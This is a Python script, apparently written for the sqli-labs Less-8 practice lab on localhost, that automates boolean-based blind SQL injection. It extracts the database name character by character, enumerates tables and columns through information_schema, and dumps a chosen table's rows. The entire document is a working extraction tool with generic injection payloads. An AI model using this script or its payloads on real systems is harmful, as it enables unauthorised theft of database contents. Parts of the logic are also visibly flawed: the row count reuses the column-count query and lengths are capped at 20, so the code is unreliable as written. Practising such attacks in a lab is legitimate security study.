import requests

url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"

selectdatabase  = "select database()"

select_parenthese = "(%s)"
select_table_sum = "select count(*) from information_schema.tables where table_schema = '%s' "
select_table =  "select table_name from information_schema.tables where table_schema = '%s' limit %d,1 "
select_column_sum = "select count(*) from information_schema.columns where table_schema = '%s' and table_name = '%s' "
select_column = "select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1 "
select_dump_sum = "select count(*) from %s "
select_dump = "select %s from %s limit %d,1 "

datastr = "(select database())"
userstr = "(select user())"
ascstr = " ' and  ascii(substr((%s),%d,1))>=%d "
lenstr = " ' and  length(%s)>%d "
note = "-- -"



def getStatue(url):
    r = requests.get(url)
    text = r.text
    if(text.find('You are in')>0):
        return True
    else:
        return False

def GetName(injecturl,payload,SelectContent,length,note):
    Name = ""
    for pos in range(1,length+1):
        Max = 127
        Min = 32
        Mid = ( Max + Min ) // 2
        while Min < Max-1 :
            finalurl = injecturl + payload%(SelectContent,pos,Mid) + note
            print(finalurl)

            if(getStatue(finalurl)>0):
                Min = Mid
            else:
                Max = Mid

            Mid = (Max + Min) // 2

        Name+=chr(Mid)

    return Name

def GetLength(injecturl,SelectSentence):
   for x in range(20):
        finalurl = injecturl+lenstr%(SelectSentence,x)+note
        print(finalurl)
        if(getStatue(finalurl)==False):
            break
   return x


def GetSelectInfo(SelectSentence):
    Length = GetLength(url,SelectSentence)
    Name = GetName(url,ascstr,SelectSentence,Length,note)
    return    Name

db_name = GetSelectInfo(datastr)
table_sum = GetSelectInfo((select_parenthese%(select_table_sum%(db_name))))

All_tables = []
for line in range(0,int(table_sum)):
    All_tables.append(GetSelectInfo(select_parenthese%(select_table%(db_name,line))))

print(All_tables)

#Input table name
while True:
    column_table = input("Which table do you want to dump ?")
    if(column_table not in All_tables):
        print("Doesn't exit the table %s \n"%column_table)
    else:
        break


#get the columns
column_sum = GetSelectInfo(select_parenthese%(select_column_sum%(db_name,column_table)))
All_columns = []
for row in range(0,int(column_sum)):
    All_columns.append(GetSelectInfo(select_parenthese%(select_column%(db_name,column_table,row))))
print(All_columns)


#Continue dump note :
while True:
    choice = input("dump it ? \n")
    if(choice == "n"):
        exit(0)
    else:
        break

#Get how much row the tables have
dump_sum = GetSelectInfo(select_parenthese%(select_column_sum%(db_name,column_table)))


#dump all columns
Data = []
for col in All_columns:
    for data_line in range(0,int(dump_sum)):
        Data.append(GetSelectInfo(select_parenthese%(select_dump%(col,column_table,data_line))))

for col in All_columns:
    print(col,end="\t")
    print()

for rw in range(0,int(dump_sum)):
    for ln in range(0, int(column_sum)):
        print(Data[ln*int(column_sum)+rw],end="\t")
    print()



print(Data)
